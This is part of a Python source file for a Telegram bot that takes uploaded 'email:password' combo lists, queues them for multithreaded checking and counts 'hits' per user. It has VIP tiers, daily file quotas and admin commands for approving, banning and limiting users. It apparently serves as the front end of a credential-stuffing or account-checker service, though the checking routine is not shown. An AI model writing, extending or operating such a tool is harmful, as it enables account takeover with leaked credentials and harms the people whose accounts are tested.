    if not user.get("approved") and user_id not in ADMIN_IDS:
        await update.message.reply_text("⏳ Access pending admin approval.")
        return

    level_names = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}
    daily_files = user["daily_stats"]["files_uploaded"]
    daily_limit = get_daily_limit(user)
    limit_text = f"{daily_files}/{'∞' if daily_limit >= 9999 else daily_limit}"

    await update.message.reply_text(
        f"📊 *Your Statistics*\n\n"
        f"**Level:** {level_names[user['vip_level']]}\n"
        f"**Today's files:** {limit_text}\n"
        f"**Total jobs:** {user['total_jobs']}\n"
        f"**Total hits:** {user['total_hits']}",
        parse_mode=ParseMode.MARKDOWN
    )


async def setlevel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    try:
        target_id = int(context.args[0])
        level = int(context.args[1])
        if level not in (0, 1, 2):
            await update.message.reply_text("Level must be 0, 1, or 2.")
            return
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /setlevel <user_id> <0|1|2>")
        return
    update_user(target_id, {"vip_level": level})
    await update.message.reply_text(f"✅ User `{target_id}` level → {LEVEL_NAMES[level]}", parse_mode=ParseMode.MARKDOWN)


async def setlimit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    try:
        target_id = int(context.args[0])
        limit = int(context.args[1])
        if limit < 0:
            raise ValueError
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /setlimit <user_id> <number>  (0 = block, 9999 = unlimited)")
        return
    update_user(target_id, {"custom_daily_limit": limit})
    label = "∞" if limit >= 9999 else str(limit)
    await update.message.reply_text(f"✅ User `{target_id}` daily limit → `{label}` files/day", parse_mode=ParseMode.MARKDOWN)


async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    try:
        target_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    get_user(target_id)
    update_user(target_id, {"banned": True})
    await update.message.reply_text(f"🚫 User `{target_id}` has been banned.", parse_mode=ParseMode.MARKDOWN)


async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    try:
        target_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    update_user(target_id, {"banned": False})
    await update.message.reply_text(f"✅ User `{target_id}` has been unbanned.", parse_mode=ParseMode.MARKDOWN)


async def manage_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    try:
        target_id = str(int(context.args[0]))
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /manage <user_id>")
        return
    get_user(int(target_id))
    users = load_users()
    u = users.get(target_id, {})
    level = u.get("vip_level", 0)
    banned = u.get("banned", False)
    custom_lim = u.get("custom_daily_limit")
    daily_used = u.get("daily_stats", {}).get("files_uploaded", 0)
    eff_limit = custom_lim if custom_lim is not None else DAILY_FILE_LIMITS.get(level, 3)
    lim_display = "∞" if eff_limit >= 9999 else str(eff_limit)

    text = (
        f"{'🚫 BANNED — ' if banned else ''}👤 *User: `{target_id}`*\n\n"
        f"Level: {LEVEL_NAMES.get(level, str(level))}\n"
        f"Daily files: `{daily_used}/{lim_display}` "
        f"{'(custom)' if custom_lim is not None else ''}\n"
        f"Total jobs: `{u.get('total_jobs', 0)}` | Hits: `{u.get('total_hits', 0)}`\n"
    )
    keyboard = [
        [
            InlineKeyboardButton("👤 Normal", callback_data=f"adm_lvl_{target_id}_0"),
            InlineKeyboardButton("⭐ VIP", callback_data=f"adm_lvl_{target_id}_1"),
            InlineKeyboardButton("👑 VIP+", callback_data=f"adm_lvl_{target_id}_2"),
        ],
        [
            InlineKeyboardButton("📅 3/day", callback_data=f"adm_lim_{target_id}_3"),
            InlineKeyboardButton("📅 10", callback_data=f"adm_lim_{target_id}_10"),
            InlineKeyboardButton("📅 25", callback_data=f"adm_lim_{target_id}_25"),
            InlineKeyboardButton("📅 ∞", callback_data=f"adm_lim_{target_id}_9999"),
        ],
        [
            InlineKeyboardButton("🔄 Reset Daily", callback_data=f"adm_reset_{target_id}"),
            InlineKeyboardButton("📁 Files", callback_data=f"adm_files_{target_id}"),
        ],
        [
            InlineKeyboardButton("🚫 Ban" if not banned else "✅ Unban",
                                 callback_data=f"adm_ban_{target_id}" if not banned else f"adm_unban_{target_id}"),
        ],
    ]
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    job = user_jobs.get(user_id)
    if job and job.status == "running":
        job.cancel_event.set()
        await update.message.reply_text("⏹️ Cancelling your job...")
    else:
        await update.message.reply_text("You have no active job.")


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    user = get_user(user_id)

    if not user.get("approved") and user_id not in ADMIN_IDS:
        await update.message.reply_text("⏳ Your account is pending admin approval.")
        return

    if user.get("banned"):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    vip_level = user.get("vip_level", 0)
    max_file_size = FILE_SIZE_LIMITS.get(vip_level, FILE_SIZE_LIMITS[0])
    daily_limit = get_daily_limit(user)
    daily_uploaded = user["daily_stats"]["files_uploaded"]

    if daily_limit != 9999 and daily_uploaded >= daily_limit:
        await update.message.reply_text(
            f"❌ Daily limit reached: {daily_uploaded}/{daily_limit} files.\n"
            f"Try again tomorrow or contact admin."
        )
        return

    doc = update.message.document
    if doc.file_size > max_file_size:
        mb_limit = max_file_size / (1024 * 1024)
        await update.message.reply_text(f"❌ Max file size: {mb_limit:.0f} MB for your level.")
        return

    if user_id in user_jobs and user_jobs[user_id].status in ("queued", "running"):
        await update.message.reply_text("You already have a job in progress. Use /cancel first.")
        return

    file = await doc.get_file()
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode("utf-8", errors="ignore")

    combo_list = []
    for line in content.splitlines():
        line = line.strip()
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                combo_list.append((parts[0].strip(), parts[1].strip()))

    if not combo_list:
        await update.message.reply_text("No valid email:password lines found.")
        return

    increment_daily_file_count(user_id)
    update_user(user_id, {"total_jobs": user["total_jobs"] + 1})

    filename = doc.file_name or "uploaded.txt"
    priority = 0 if vip_level > 0 else 1
    job = Job(user_id, chat_id, combo_list, filename, priority=priority)
    user_jobs[user_id] = job

    await job_queue.put(job)

    await update.message.reply_text(
        f"📥 {len(combo_list)} accounts added to queue.\n"
        f"Queue position: {job_queue.qsize()}"
    )


# ================= POST INIT =================
async def post_init(app: Application):
    global job_queue
    # Create asyncio objects inside the running event loop
    job_queue = asyncio.PriorityQueue()

    asyncio.create_task(daily_reset_check())
    for _ in range(MAX_CONCURRENT_JOBS):
        asyncio.create_task(queue_worker(app.bot))

    print(f"✅ {MAX_CONCURRENT_JOBS} queue workers started.")


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.post_init = post_init

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("setlevel", setlevel))
    app.add_handler(CommandHandler("setlimit", setlimit))
    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CommandHandler("unban", unban_user))
    app.add_handler(CommandHandler("manage", manage_user))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^adm_"))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_file))

    print("🚀 Bot starting...")
    print(f"⚙️ Threads per job: {THREADS_PER_JOB} | Max concurrent jobs: {MAX_CONCURRENT_JOBS}")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    app.run_polling()


if __name__ == "__main__":
    Path(RESULT_BASE_DIR).mkdir(exist_ok=True)
    main()
